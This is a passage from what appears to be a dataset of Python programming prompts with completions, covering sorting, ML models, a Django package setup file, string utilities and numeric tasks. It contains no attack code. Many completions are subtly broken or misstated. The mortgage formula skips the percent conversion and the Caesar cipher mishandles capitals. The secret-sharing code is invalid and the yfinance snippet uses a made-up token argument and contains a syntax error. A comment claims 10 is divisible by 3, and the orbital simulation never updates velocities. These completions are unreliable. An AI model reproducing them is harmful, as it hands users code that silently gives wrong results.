Job Title: {job_title}')"},{"prompt":"Create a Python code to do text classification based on a provided dataset.","completion":"import pandas as pd import numpy as np def TextClassifier(x_train, y_train, x_test, y_test): from sklearn.naive_bayes import MultinomialNB model = MultinomialNB() model.fit(x_train, y_train) y_pred = model.predict(x_test) accuracy = np.mean(y_test == y_pred) return accuracy"},{"prompt":"Create a Python program that encodes a given passage using the Caesar Cipher algorithm. plaintext = This is a secret message. caesar_key = 0","completion":"def caesar_cipher(plaintext, caesar_key): ciphertext = \\"\\" for char in plaintext: if char.isalpha(): ascii_char = ord(char) - caesar_key if ascii_char < 97: ascii_char += 26 ciphertext += chr(ascii_char) else: ciphertext += char return ciphertext plaintext = \\"This is a secret message.\\" caesar_key = 0 encoded_message = caesar_cipher(plaintext, caesar_key) print(encoded_message)"},{"prompt":"Write an algorithm in Python to determine the largest number in an array. arr = [10, 8, 12, 4, 6]","completion":"def find_max(arr): max_val = arr[0] for i in range(1, len(arr)): if arr[i] > max_val: max_val = arr[i] return max_val # Driver code arr = [10, 8, 12, 4, 6] result = find_max(arr) print(result) # Output: 12"},{"prompt":"Create a Python script to calculate the monthly mortgage payment. loan_amount = 120000 annual_interest_rate = 3.25 loan_duration_in_years = 30","completion":"def monthly_mortgage_payment(loan_amount, annual_interest_rate, loan_duration_in_years): monthly_interest_rate = annual_interest_rate / 12 number_of_payments = loan_duration_in_years * 12 monthly_payment = loan_amount * (monthly_interest_rate / (1 - (1 + monthly_interest_rate)**(-number_of_payments))) return monthly_payment print(monthly_mortgage_payment(loan_amount, annual_interest_rate, loan_duration_in_years)) # Output -> 585.89"},{"prompt":"Generate a correctly formatted python program that sorts an array of integers","completion":"def sort_arr(arr): for i in range(len(arr)): for j in range(i + 1, len(arr)): if arr[i] > arr[j]: arr[i], arr[j] = arr[j], arr[i] return arr"},{"prompt":"Write a Python code for sorting a list of integers in ascending order. [5,2,7,3,1]","completion":"list=[5,2,7,3,1] list.sort() print(list)"},{"prompt":"Generate a Python program that accepts an integer, n, and prints a right triangle made of asterisks with the base of n.","completion":"n = int(input(\\"Enter an integer: \\")) for i in range(n): for j in range(i + 1): print(\\"*\\", end=\\"\\") print(\\"\\")"},{"prompt":"Create a Python script to evaluate a given polynomial equation. 2x2 + 3x + 4","completion":"def evaluate_polynomial(eqn): x = int(input(\\"Enter the value of x: \\")) result = 0 for i in range(len(eqn)): elem = eqn[i] if elem[-1] == 'x': coefficient = int(elem[:-1]) if i == 0: result += coefficient * (x ** 2) elif i == 1: result += coefficient * x else: result += coefficient else: result += int(elem) return result print(evaluate_polynomial(\\"2x2 + 3x + 4\\"))"},{"prompt":"Optimize a recursive Fibonacci sequence program written in Python. def Fibonacci(n): if n <= 0: return 0 elif n == 1: return 1 else: return Fibonacci(n1)+Fibonacci(n2)","completion":"def Fibonacci(n): if n <= 0: return 0 elif n == 1: return 1 else: a = 0 b = 1 for i in range(2,n+1): c = a + b a = b b = c return b"},{"prompt":"Create a Python program to generate a random password string. This password string should include uppercase letters, lowercase letters, digits and symbols. Not applicable","completion":"import random import string def generate_password(): # Generate a password of length 8 # with random uppercase, lowercase, digits and symbols length = 8 # Create a set of characters to choose from characters = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation password = \\"\\".join(random.choice(characters) for x in range(length)) return password print(generate_password())"},{"prompt":"Provide a Python program that takes a number as input, and calculates the factorial of that number. 5","completion":"def factorial(num): if num == 0: return 1 else: return num * factorial(num-1) num = int(input(\\"Enter a number:\\")) print(factorial(num))"},{"prompt":"Write a python program that implements the following function: Given two sorted lists, return a merged sorted list.","completion":"def merge_sorted_lists(list1, list2): merged_list = [] while list1 and list2: if list1[0] < list2[0]: merged_list.append(list1.pop(0)) else: merged_list.append(list2.pop(0)) merged_list += list1 + list2 return merged_list"},{"prompt":"Write a Python script to implement a linear search algorithm. Data: [5, 4, 2, 8, 7] Key: 7","completion":"def linear_search(data, key): for i in range(len(data)): if data[i] == key: return i return -1 data = [5, 4, 2, 8, 7] key = 7 result = linear_search(data, key) if result != -1: print(\\"Element found at \\" + str(result)) else: print(\\"Element not found\\")"},{"prompt":"Categorize the following code snippets into their respective languages: def childName(name): print('The child will be called', name)","completion":"Python"},{"prompt":"To install djangotwilio, follow these steps: 1. Ensure that you have the required dependencies installed: setuptools>=36.2, twilio>=6.3.0,<7, djangophonenumberfield>=0.6, and phonenumbers>=8.10.22. 2. Determine which version of Django you are using and add the appropriate version to the INSTALL_PYTHON_REQUIRES list. 3. Run the setup.py file to install djangotwilio. 4. Verify that djangotwilio has been installed by checking the list of installed packages.","completion":"# -*- coding: utf-8 -*- from __future__ import unicode_literals, absolute_import from os.path import abspath, dirname, join, normpath from setuptools import find_packages, setup import sys INSTALL_PYTHON_REQUIRES = [] # We are intending to keep up to date with the supported Django versions. # For the official support, please visit: # https://docs.djangoproject.com/en/3.0/faq/install/#what-python-version-can-i-use-with-django and you may change the version in the URL to suit your needs, and we will try to update that here too as we upgrade with django. if sys.version_info[1] == 5: # py3.5 can run 1.11 < 2.2 django_python_version_install = 'Django>=2.2,<3.0', INSTALL_PYTHON_REQUIRES.append(django_python_version_install) elif sys.version_info[1] == 6: # py3.6 can run 1.11 < 3.1 (likely will be <4.0) django_python_version_install = 'Django>=2.2,<3.2', INSTALL_PYTHON_REQUIRES.append(django_python_version_install) elif sys.version_info[1] == 7: # py3.7 is 1.11.17 < 3.1 (likely will be <4.0) django_python_version_install = 'Django>=2.2,<3.2' INSTALL_PYTHON_REQUIRES.append(django_python_version_install) elif sys.version_info[1] == 8: # py3.8 is 2.2.8 < 3.1 (likely will be <4.0) django_python_version_install = 'Django>=2.2.8,<3.2' INSTALL_PYTHON_REQUIRES.append(django_python_version_install) setup( # Basic package information: name='django-twilio', version='0.13.1.post0', packages=find_packages(), # Packaging options: zip_safe=False, include_package_data=True, # Package dependencies: install_requires=[ 'setuptools>=36.2', 'twilio>=6.3.0,<7', 'django-phonenumber-field>=0.6', 'phonenumbers>=8.10.22', ] + INSTALL_PYTHON_REQUIRES, # Metadata for PyPI: author='Randall Degges', author_email='rdegges@gmail.com', maintainer=\\"Jason Held\\", maintainer_email=\\"jasonsheld@gmail.com\\", license='UNLICENSE', url='https://github.com/rdegges/django-twilio', keywords='twilio telephony call phone voip sms django django-twilio', description='Build Twilio functionality into your Django apps.', long_description=open( normpath(join(dirname(abspath(__file__)), 'README.rst')) ).read(), project_urls={ \\"Documentation\\": \\"https://django-twilio.readthedocs.io/en/latest/\\", \\"Code\\": \\"https://github.com/rdegges/django-twilio\\", \\"Tracker\\": \\"https://github.com/rdegges/django-twilio/issues\\", }, classifiers=[ 'Framework :: Django', 'Framework :: Django :: 2.2', 'Framework :: Django :: 3.0', 'Intended Audience :: Developers', 'License :: Public Domain', 'Operating System :: OS Independent', 'Programming Language :: Python', 'Programming Language :: Python :: 3', 'Programming Language :: Python :: 3 :: Only', 'Programming Language :: Python :: 3.5', 'Programming Language :: Python :: 3.6', 'Programming Language :: Python :: 3.7', 'Programming Language :: Python :: 3.8', 'Programming Language :: Python :: Implementation :: CPython', 'Programming Language :: Python :: Implementation :: PyPy', 'Topic :: Internet :: WWW/HTTP', ] )"},{"prompt":"Build a function to sort an array of words by their length in Python.","completion":"def sort_by_length(words): return sorted(words, key=len)"},{"prompt":"Generate a Python code to compute the area of a triangle given its three sides. s1 = 3 s2 = 4 s3 = 5","completion":"def calculate_area(s1, s2, s3): # calculate the semi-perimeter s = (s1 + s2 + s3) / 2 # calculate area using Heron's formula area = (s*(s-s1)*(s-s2)*(s-s3)) ** 0.5 return area if __name__==\\"__main__\\": s1 = 3 s2 = 4 s3 = 5 area = calculate_area(s1, s2, s3) print(\\"Area of triangle is: {:.2f}\\".format(area))"},{"prompt":"Create a Python script which takes in a sentence and prints the 2nd and 5th words. The quick brown fox jumped over the lazy dog","completion":"sentence = \\"The quick brown fox jumped over the lazy dog\\" words = sentence.split(' ') # 2nd and 5th words print(words[1] + \\" \\" + words[4])"},{"prompt":"Generate a Python function to generate an equation with given coefficients and variables. coefficients: [2, 3, 1], variables: [x, y, z]","completion":"def generate_equation(coefficients, variables): equation = \\"\\" for i, coeff in enumerate(coefficients): equation += str(coeff) + variables[i] + \\" + \\" equation = equation[:-3] return equation"},{"prompt":"mplement a cost function with two parameters in Python.","completion":"def cost_function(x, y): return (x**2 + y**2)"},{"prompt":"Create a Python program to generate a Shamir's Secret Sharing Scheme implementation with a minimum of 8 shares. Not applicable","completion":"import sys import secrets from typing import List def split_secret(secret: bytes, nb_shares: int, min_required: int) -> List[int]: # Generate random prime r = secrets.randbelow(sys.maxsize) while not is_prime(r): r = secrets.randbelow(sys.maxsize) # Generate random coefficients coefficients = [secret] + [ secrets.randbelow(r) for i in range(min_required-1) ] # Compute the shares shares = [] for i in range(1, nb_shares + 1): val = coefficients[0] for e, c in enumerate(coefficients[1:]): val += c * pow(i, e+1, r) shares.append(val) return shares def is_prime(x): return pow(2, x-1, x) == 1 # Split secret secret = b'ABCDEFGH' shares = split_secret(secret, 8, 5) print(shares)"},{"prompt":"Create a Python application to predict wine quality. The application should use the Wine Quality dataset from UC Irvine and build a predictive model using the kNN algorithm. URL of the dataset: https://archive.ics.uci.edu/ml/machinelearningdatabases/winequality/winequality.d","completion":"import pandas as pd from sklearn.model_selection import train_test_split from sklearn.neighbors import KNeighborsClassifier # read in data wine_data = pd.read_csv('https://archive.ics.uci.edu/ml/machine-learning-databases/wine-quality/winequality.data') X = wine_data.drop(columns=['quality']) y = wine_data['quality'] # split into training and test sets X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state=42) # initialize model and fit to training data knn = KNeighborsClassifier() knn.fit(X_train, y_train) # predict on test set y_pred = knn.predict(X_test) # score the model score = knn.score(X_test, y_test) print(score)"},{"prompt":"Debug the following Python program to print the given output. a = [3,4,6,2,1] for x in a: print(x) Expected Output: 1 2 3 4 6","completion":"a = [3,4,6,2,1] for x in a: print(x) a.sort() for x in a: print(x) Output: 1 2 3 4 6"},{"prompt":"Propose a Pythonic solution to the following code # List of nonempty strings items = ['apple', 'banana', 'cat', 'dog', 'elephant'] for i in range(len(items)): print('item ' + str(i) + ' is ' + items[i])","completion":"# List of non-empty strings items = ['apple', 'banana', 'cat', 'dog', 'elephant'] for i, item in enumerate(items): print('item ' + str(i) + ' is ' + item)"},{"prompt":"Write a classbased calculator in Python and implement basic operations such as addition, subtraction, multiplication, and division.","completion":"class Calculator: def __init__(self): self.result = 0 def add(self, num): self.result += num return self.result def subtract(self, num): self.result -= num return self.result def multiply(self, num): self.result *= num return self.result def divide(self, num): self.result /= num return self.result"},{"prompt":"Given a pandas dataframe of salaries, write a python program that takes the dataframe and filters out employees whose salary is below mean salary of the whole dataset. import pandas as pd salaries = pd.DataFrame({ 'name': ['John','Cathy','Michael','Steve', 'Tina','Paul','Brunette'], 'salary': [25000, 74000 , 80000, 150000, 71000, 59000, 64000] }, columns=['name', 'salary'])","completion":"import pandas as pd # calculate the mean salary mean_salary = salaries['salary'].mean() # filter out employees whose salary is below the mean filtered_salaries = salaries[salaries['salary'] >= mean_salary] # print the filtered data print(filtered_salaries)"},{"prompt":"Program a function in Python that creates all substrings of a given string. The string is create.","completion":"def createSubstrings(string): length = len(string) subString = [] # Loops through the string # and the length of substring to be formed for i in range(length): for j in range(i + 1, length + 1): subString.append(string[i:j]) return subString"},{"prompt":"Design a genetic algorithm in Python to maximize a given objective function.","completion":"import random def genetic_algorithm(objective_func, pop_size, max_iters, elitism_ratio): population = [random.randint(0, 100) for _ in range(pop_size)] # Iterate through the generations for _ in range(max_iters): # Score the current population population_scores = [objective_func(num) for num in population] # Select the best individuals and breed them elite_length = int(elitism_ratio * pop_size) elite_indices = sorted(range(len(population_scores)), key=lambda k: population_scores[k], reverse=True)[:elite_length] elite_population = [population[i] for i in elite_indices] parent_pool = [population_scores.index(score) for score in population_scores if population_scores.index(score) not in elite_indices] breed_length = pop_size - len(elite_indices) breed_children = [gene_crossover(population[i], population[j]) for i, j in zip(random.sample(parent_pool, breed_length // 2), random.sample(parent_pool, breed_length // 2))] + elite_population # Apply mutation for i in range(len(breed_children)): child = gene_mutation(breed_children[i]) breed_children[i] = child population = breed_children return max(population_scores)"},{"prompt":"Design a function in Python that checks whether a number is an Armstrong number or not. n = 1634","completion":"def isArmstrongNumber(x): sum = 0 order = len(str(x)) temp = x while temp > 0: digit = temp % 10 sum += digit ** order temp //= 10 # If n is equal to the sum # of its digits raised to the power # of the number of digits if x == sum: return True else: return False # Driver Program n = 1634 if isArmstrongNumber(n): print(\\"Yes\\") else: print(\\"No\\") # Output:Yes"},{"prompt":"Create a Python script to generate an XML sitemap of a website. Example of a website URL","completion":"import requests from bs4 import BeautifulSoup from xml.dom import minidom # Get the website content url = \\"http://example.com\\" response = requests.get(url) soup = BeautifulSoup(response.text, \\"html.parser\\") # Create the XML document doc = minidom.Document() root = doc.createElement('urlset') root.setAttribute(\\"xmlns\\", \\"http://www.sitemaps.org/schemas/sitemap/0.9\\") # Parse the website pages for link in soup.find_all('a'): page = doc.createElement('url') page.appendChild(doc.createElement('loc')).appendChild(doc.createTextNode(link.get('href'))) root.appendChild(page) # Generate the file doc.appendChild(root) filename = \\"sitemap.xml\\" f = open(filename,\\"w\\") doc.writexml(f, indent=\\" \\", addindent=\\" \\", newl='n') f.close()"},{"prompt":"Develop a Python AI model that can predict the stock prices of a company.","completion":"import pandas as pd import numpy as np import matplotlib.pyplot as plt from sklearn.linear_model import LinearRegression from sklearn.svm import SVR from sklearn.preprocessing import MinMaxScaler #import the data data = pd.read_csv('stock-data.csv') #split the data X = data[['open', 'high', 'low', 'close']] y = data['Adj Close'] #scaling the data scaler = MinMaxScaler() X_scaled = scaler.fit_transform(X) #fitting the model model = SVR(kernel='rbf', gamma='scale') model.fit(X_scaled, y) #make prediction prediction = model.predict(X_scaled) #plotting the results plt.scatter(prediction, y) plt.xlabel('Predicted Stock Prices') plt.ylabel('Actual Stock Prices') plt.show()"},{"prompt":"Write a function in Python that takes three string arguments and returns a list where the elements are the concatenation of each pair of strings. str1 = This str2 = is str3 = fun","completion":"def strJoin(str1, str2, str3): return [str1 + str2, str2 + str3, str1 + str3]"},{"prompt":"Create a Python Flask application for a simple todo list. The application should include models for a TodoItem (with fields for title, description, and priority) and a RESTful API which includes endpoints for creating, retrieving, updating, and deleting TodoItems. Not applicable","completion":"from flask import Flask from flask_restful import Resource, Api, reqparse app = Flask(__name__) api = Api(app) parser = reqparse.RequestParser() parser.add_argument('title') parser.add_argument('description') parser.add_argument('priority', type=int) todoItems = [] class TodoItemList(Resource): def get(self): return todoItems def post(self): args = parser.parse_args() todoItem = {'title': args['title'], 'description': args['description'], 'priority': args['priority']} todoItems.append(todoItem) return todoItem, 201 class TodoItem(Resource): def get(self, todoItemId): return todoItems[todoItemId] def put(self, todoItemId): args = parser.parse_args() todoItem = {'title': args['title'], 'description': args['description'], 'priority': args['priority']} todoItems[todoItemId] = todoItem return todoItem def delete(self, todoItemId): del todoItems[todoItemId] return '', 204 api.add_resource(TodoItemList, '/todoitems') api.add_resource(TodoItem, '/todoitems/<int:todoItemId>') if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Generate a function in Python to edit a given string and capitalize a given character at a specific position. Hello World! and 5","completion":"def capitalizeCharacter(s, pos): # Grab single characters from the string # starting from the given index result = s[:pos] + s[pos].upper() + s[pos + 1:] return result"},{"prompt":"Describe a data structure for efficient retrieval of data in Python.","completion":"In Python, a dictionary is an ideal data structure for efficient retrieval of data as it provides constant time complexity for lookup operations. This is because a dictionary is a data structure which creates a mapping between a key and its associated value, allowing access to its value by simply providing the key. Moreover, Python dictionary allows the user to add, modify, delete and retrieve data entries in constant time and thus provides an efficient retrieval of data."},{"prompt":"Create a code that runs an orbital dynamics simulation in Python.","completion":"import numpy as np import matplotlib.pyplot as plt # Define some constants G = 1 # Define some parameters m1 = 1 m2 = 1 # Initial conditions x1_0 = 0 # initial position of the first mass y1_0 = 0 vx1_0 = 1 # initial velocity of the first mass (along the x-axis) vy1_0 = 0 x2_0 = 3 # initial position of the second mass y2_0 = 0 vx2_0 = 0 # initial velocity of the second mass (along the x-axis) vy2_0 = 0.5 # Simulation parameters N = 1000 # number of steps dt = 1e-3 # time step # Create arrays to hold the x,y positions of the masses x1 = np.zeros(N) y1 = np.zeros(N) x2 = np.zeros(N) y2 = np.zeros(N) # Initial conditions x1[0] = x1_0 y1[0] = y1_0 x2[0] = x2_0 y2[0] = y2_0 # Simulation loop for i in range(N-1): # Calculate the force for the first mass dx = x2[i] - x1[i] dy = y2[i] - y1[i] r = np.sqrt(dx**2 + dy**2) Fx1 = G*m2/r**3 * dx Fy1 = G*m2/r**3 * dy # Calculate the force for the second mass dx = x1[i] - x2[i] dy = y1[i] - y2[i] r = np.sqrt(dx**2 + dy**2) Fx2 = G*m1/r**3 * dx Fy2 = G*m1/r**3 * dy # Update the positions x1[i+1] = x1[i] + vx1_0 * dt + Fx1 * dt**2 / 2 y1[i+1] = y1[i] + vy1_0 * dt + Fy1 * dt**2 / 2 x2[i+1] = x2[i] + vx2_0 * dt + Fx2 * dt**2 / 2 y2[i+1] = y2[i] + vy2_0 * dt + Fy2 * dt**2 / 2 # Plot the results plt.plot(x1, y1, label=\\"Mass 1\\") plt.plot(x2, y2, label=\\"Mass 2\\") plt.xlabel(\\"x-position\\") plt.ylabel(\\"y-position\\") plt.legend(loc=\\"lower right\\") plt.show()"},{"prompt":"Generate code to perform principal component analysis in Python.","completion":"import numpy as np from sklearn.decomposition import PCA # Input array X = np.array([[1,2,3],[4,5,6],[7,8,9]]) # Create and fit the PCA pca = PCA(n_components=2) pca.fit(X) # Transform data into principal components X_pca = pca.transform(X) # Output the first principal component print(X_pca[:,0])"},{"prompt":"Design a program in Python to separate a list of numbers into even and odd numbers. [2, 3, 5, 6, 8, 9, 10]","completion":"def separate_numbers(list): even_numbers = [] odd_numbers = [] for num in list: if num % 2 == 0: even_numbers.append(num) else: odd_numbers.append(num) return even_numbers, odd_numbers list = [2, 3, 5, 6, 8, 9, 10] even_numbers, odd_numbers = separate_numbers(list) print(\\"Even numbers in the list:\\", even_numbers) print(\\"Odd numbers in the list:\\", odd_numbers)"},{"prompt":"Python, generate a list of numbers from 0 to 30 with a step size of 5.","completion":"my_list = list(range(0, 30, 5)) print(my_list)"},{"prompt":"Create a Python script to read in a list of numbers and find the maximum. [3, 4, 5, 7, 10]","completion":"\\"\\"\\" Create a python script to read in a list of numbers and find the maximum \\"\\"\\" # define list of numbers numbers = [3, 4, 5, 7, 10] # define function to get maximum value in list def get_max(numbers): max_value = numbers[0] for i in numbers: if i > max_value: max_value = i return max_value # call the function max_value = get_max(numbers) # print the result print(\\"The maximum value is: {}\\".format(max_value))"},{"prompt":"Create a function in Python that takes an integer and prints all its factors. 60","completion":"def find_factors(num): factors = [] for i in range(2, num): if (num % i == 0): factors.append(i) print(f\\"Factors of {num}: {factors}\\") find_factors(60)"},{"prompt":"Create an ML model for opinion mining in Python. Not applicable","completion":"import numpy as np import pandas as pd from sklearn.model_selection import train_test_split from sklearn.feature_extraction.text import CountVectorizer from sklearn.linear_model import LogisticRegression # Load the data data = pd.read_csv('data.csv') # Define X and y X = data['text'] y = data['sentiment'] # Split into training and test set X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 101) # Create a CountVectorizer vect = CountVectorizer(stop_words='english') # Fit and transform the training data X_train_vect = vect.fit_transform(X_train) # Transform the test data X_test_vect = vect.transform(X_test) # Fit a LogisticRegression model lr = LogisticRegression() lr.fit(X_train_vect, y_train) # Predict on the test set lr_pred = lr.predict(X_test_vect)"},{"prompt":"Develop a Python function to find the average of a list of positive numbers in the given range. [1, 2, 3, 4]","completion":"def find_average(nums): sum = 0 count = 0 for num in nums: if num > 0: sum += num count += 1 return sum/count print (find_average([1, 2, 3, 4]))"},{"prompt":"Rewrite a Python script in Swift to generate random string of length n. Length: 8","completion":"import Foundation func randomString(length: Int) -> String { let letters = \\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\\" return String((0..<length).map { _ in letters.randomElement()! }) } let str = randomString(length: 8) print(str)"},{"prompt":"Develop a program to track the stock price using the Yahoo Finance API in Python Yahoo API token: abc123","completion":"import yfinance as yf # Get the data of the stocks for the given ticker ticker = \\"AAPL\\" data = yf.Ticker(ticker) # The Yahoo API token token = \\"abc123\\" # Get historical data for the ticker data.history(period=\\"1mo\\", token=token) # Print the price print(data.history(token=token)[\\"Close\\"].iloc[-1})"},{"prompt":"Create a forloop in Python to iterate over a list and print each element. words = [these, are, some, words]","completion":"words = [\\"these\\", \\"are\\", \\"some\\", \\"words\\"] for word in words: print(word)"},{"prompt":"Design a program in Python that takes two integers as inputs and outputs the greatest common divisor of the two integers.","completion":"def gcd(a,b): # base case if (a == 0): return b if (b == 0): return a if (a == b): return a if (a > b): return gcd(a-b, b) return gcd(a, b-a)"},{"prompt":"Optimize your code in Python so that it runs faster.","completion":"import time def slow_function(): # some code that takes a long time to run time.sleep(5) start_time = time.time() slow_function() elapsed_time = time.time() - start_time print(f\\"Function took {elapsed_time} seconds.\\") # Rewritten with optimisation import time from functools import lru_cache @lru_cache() def fast_function(): # some code that takes a long time to run time.sleep(5) start_time = time.time() fast_function() elapsed_time = time.time() - start_time print(f\\"Function took {elapsed_time} seconds.\\")"},{"prompt":"Create a functions to implement a linear search algorithm in Python.","completion":"def linear_search(arr, key): pos = 0 while pos < len(arr): if arr[pos] == key: return pos pos += 1 return -1"},{"prompt":"Generate a RandomForest classifier in Python that predicts a binary outcome from three numerical input features. Not applicable","completion":"import pandas as pd from sklearn.ensemble import RandomForestClassifier # Load the data data = pd.read_csv('data.csv') # Split the data into features and target X = data[['feature1','feature2','feature3']] y = data['outcome'] # Train the model clf = RandomForestClassifier(n_estimators=100, max_depth=5, random_state=42) clf.fit(X, y)"},{"prompt":"Create a Python program which takes in a string of text and returns all the unique words in the string. Hello, my name is John","completion":"def find_unique_words(string): return set(string.split())"},{"prompt":"This code provides several utility functions. To use them, import the \`re\` module and this \`util\` module. The functions provided are: \`camelcase_to_slash(name)\`: converts a CamelCase string to a camel/case string. \`strip_charset(content_type)\`: strips the charset information from a ContentType string. \`extract_charset(content_type)\`: extracts the charset information from a ContentType string. \`get_charset(request)\`: extracts the charset information from the ContentType header of a request. \`parse_accept_header(accept)\`: parses the Accept header of a request and returns a list of media types and their q values, ordered by q values.","completion":"# -*- coding: utf-8 -*- # util.py --- # # Created: Fri Dec 30 23:27:52 2011 (+0200) # Author: Janne Kuuskeri # import re charset_pattern = re.compile('.*;s*charset=(.*)') def camelcase_to_slash(name): \\"\\"\\" Converts CamelCase to camel/case code ripped from http://stackoverflow.com/questions/1175208/does-the-python-standard-library-have-function-to-convert-camelcase-to-camel-cas \\"\\"\\" s1 = re.sub('(.)([A-Z][a-z]+)', r'1/2', name) return re.sub('([a-z0-9])([A-Z])', r'1/2', s1).lower() def strip_charset(content_type): \\"\\"\\" Strip charset from the content type string. :param content_type: The Content-Type string (possibly with charset info) :returns: The Content-Type string without the charset information \\"\\"\\" return content_type.split(';')[0] def extract_charset(content_type): \\"\\"\\" Extract charset info from content type. E.g. application/json;charset=utf-8 -> utf-8 :param content_type: The Content-Type string (possibly with charset info) :returns: The charset or \`\`None\`\` if not found. \\"\\"\\" match = charset_pattern.match(content_type) return match.group(1) if match else None def get_charset(request): \\"\\"\\" Extract charset from the content type \\"\\"\\" content_type = request.META.get('CONTENT_TYPE', None) if content_type: return extract_charset(content_type) if content_type else None else: return None def parse_accept_header(accept): \\"\\"\\" Parse the Accept header todo: memoize :returns: list with pairs of (media_type, q_value), ordered by q values. \\"\\"\\" def parse_media_range(accept_item): \\"\\"\\" Parse media range and subtype \\"\\"\\" return accept_item.split('/', 1) def comparator(a, b): \\"\\"\\" Compare accept items a and b \\"\\"\\" # first compare q values result = -cmp(a[2], b[2]) if result is not 0: # q values differ, no need to compare media types return result # parse media types and compare them (asterisks are lower in precedence) mtype_a, subtype_a = parse_media_range(a[0]) mtype_b, subtype_b = parse_media_range(b[0]) if mtype_a == '*' and subtype_a == '*': return 1 if mtype_b == '*' and subtype_b == '*': return -1 if subtype_a == '*': return 1 if subtype_b == '*': return -1 return 0 if not accept: return [] result = [] for media_range in accept.split(\\",\\"): parts = media_range.split(\\";\\") media_type = parts.pop(0).strip() media_params = [] q = 1.0 for part in parts: (key, value) = part.lstrip().split(\\"=\\", 1) if key == \\"q\\": q = float(value) else: media_params.append((key, value)) result.append((media_type, tuple(media_params), q)) result.sort(comparator) return result # # util.py ends here"},{"prompt":"Classify programming language. Create a program to identify the programming language of a given code snippet. var x = 10; int y = 20;","completion":"def classify_programming_language(code_snippet): # create a dictionary to store the keywords for each language language_keywords = { 'python': ['def', 'print'], 'java': ['public', 'static'], 'javascript': ['var', 'function'], 'c': ['int', 'printf'] } # go through each language in the dictionary and check if any of the language keywords exist in the code snippet for language, keywords in language_keywords.items(): if any(keyword in code_snippet for keyword in keywords): return language # if no language is identified, return None return None"},{"prompt":"Create an AI assistant in Python to detect whether a sentence is a question or not. Is this a question?","completion":"import nltk sentence = \\"Is this a question?\\" words = nltk.word_tokenize(sentence) # Check if the sentence ends with a question mark if words[-1] == '?': print(\\"This is a question.\\") else: print(\\"This is not a question.\\")"},{"prompt":"Create a function in Python to take two numerical values and return true if one is divisible by the other. number1 = 10 number2 = 3","completion":"def isDivisible(a, b): return a % b == 0 print(isDivisible(number1, number2)) #True"},{"prompt":"Find the most efficient Python code to print all the divisors of an input number. input = 28","completion":"# Python Program to find the factors of a number # define a function def print_divisors(input): # find all factors of the input number for i in range(1, input + 1): if input % i == 0: print (i) # take input from the user input = 28 # print the divisors print_divisors(input)"},{"prompt":"Generate a Python script to convert cents to dollars.","completion":"def convert_cents_to_dollars(cents): return cents / 100"},{"prompt":"Write a python function to print an array in reverse order","completion":"def print_reverse(arr): for i in range(len(arr)-1, -1, -1): print(arr[i], end=\\" \\")"},{"prompt":"dentify the complexity of the following python sorting algorithms. numbers = [10, 5, 8, 7, 2, 9, 1]","completion":"[Selection Sort]: O(n^2) [Insertion Sort] : O(n^2) [Merge Sort]: O(nlogn) [Quick Sort]: O(nlogn) [Heap Sort]: O(nlogn)"},{"prompt":"Create a python program to verify if two strings are an anagram. string1: silent string2: listen","completion":"def isAnagram(str1, str2): str1 = str1.replace(\\" \\", \\"\\").lower() str2 = str2.replace(\\" \\", \\"\\").lower() # edge case if len(str1) != len(str2): return False count = {} for char in str1: if char in count: count[char] += 1 else: count[char] = 1 for char in str2: if char in count: count[char] -= 1 else: count[char] = 1 for val in count.values(): if val != 0: return False return True str1 = \\"silent\\" str2 = \\"listen\\" if isAnagram(str1, str2): print(\\"The two strings are anagrams\\") else: print(\\"The two strings are not anagrams\\")"},{"prompt":"Write a Python program to create a new list that contains all the elements of the given list multiplied by each other. nums = [1, 2, 3, 4]","completion":"def multiply(nums): result = [] for i in range(len(nums)): for j in range(i+1, len(nums)): result.append(nums[i] * nums[j]) return result"},{"prompt":"Write a Python code to find the longest palindrome in the given string. abcbaacj","completion":"def is_palindrome(string): left_pos = 0 right_pos = len(string) - 1 while right_pos >= left_pos: if not string[left_pos] == string[right_pos]: return False left_pos += 1 right_pos -= 1 return True def longest_palindrome(string): if len(string) <= 1: return string longest = \\"\\" for i in range(len(string)): for j in range(i+1, len(string)+1): substring = string[i:j] if is_palindrome(substring) and len(substring) > len(longest): longest = substring return longest string = \\"abcbaacj\\" print(\\"Original Strings:\\", string) long_palindrome = longest_palindrome(string) print(\\"Longest Palindrome is:\\", long_palindrome)"},{"prompt":"Write a function in Python that takes a list of integers and returns the sum of the even numbers in the list. [1, 2, 3, 4, 5, 6]","completion":"def sum_even_integers(lst): total = 0 for num in lst: if num % 2 == 0: total += num return total print(sum_even_integers([1, 2, 3, 4, 5, 6])) # 12"},{"prompt":"Create a list expression and a set expression in Python that converts the given list to a set. list = [1, 2, 2, 3, 4, 4, 5]","completion":"list_expression = set([x for x in list]) set_expression = set(list)"},{"prompt":"Generate a hashmap implementation in Python. The implementation should store keys and values, and be able to retrieve the value stored under the given key. Not applicable","completion":"class HashMap: def __init__(self): self.map = {} def put(self, key, value): self.map[key] = value def get(self, key): return self.map.get(key)"},{"prompt":"Generate Python code for generating a random password of length 8.","completion":"import random, string def randomPassword(length): # Generate a list of random characters gen_pass = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length)) return gen_pass random_password = randomPassword(8) print(random_password)"},{"prompt":"Develop an algorithm in Python for sorting the following array in ascending order. [9, 8, 11, 5]","completion":"def bubble_sort(arr): n = len(arr) for i in range(n): for j in range(0, n - i - 1): if arr[j] > arr[j + 1]: arr[j], arr[j + 1] = arr[j + 1], arr[j] array = [9, 8, 11, 5] bubble_sort(array) print(array)"},{"prompt":"Write a python code to get the maximum element from a given list. [7, 10, 5, 112, 0]","completion":"def get_max_elem(nums): max_elem = nums[0] for num in nums: if num > max_elem: max_elem = num return max_elem"},{"prompt":"Develop a program in Python to merge multiple data sets from different sources into one single data set. Not applicable","completion":"import pandas as pd # Load data sets data1 = pd.read_csv('data1.csv') data2 = pd.read_csv('data2.csv') data3 = pd.read_csv('data3.csv') # Merge data sets merged_data = pd.merge(data1, data2, on='ID') merged_data = pd.merge(merged_data, data3, on='ID') # Print data print(merged_data)"},{"prompt":"Write a Python program to create a dictionary with keys a, b, c and their respective values as 1, 2, 3.","completion":"mydict = { 'a': 1, 'b': 2, 'c': 3 }"},{"prompt":"Generate code to analyze sentiment of a given text using the TextBlob Python library. Not applicable","completion":"from textblob import TextBlob print('Enter your text:') text = input() blob = TextBlob(text) sentiment = 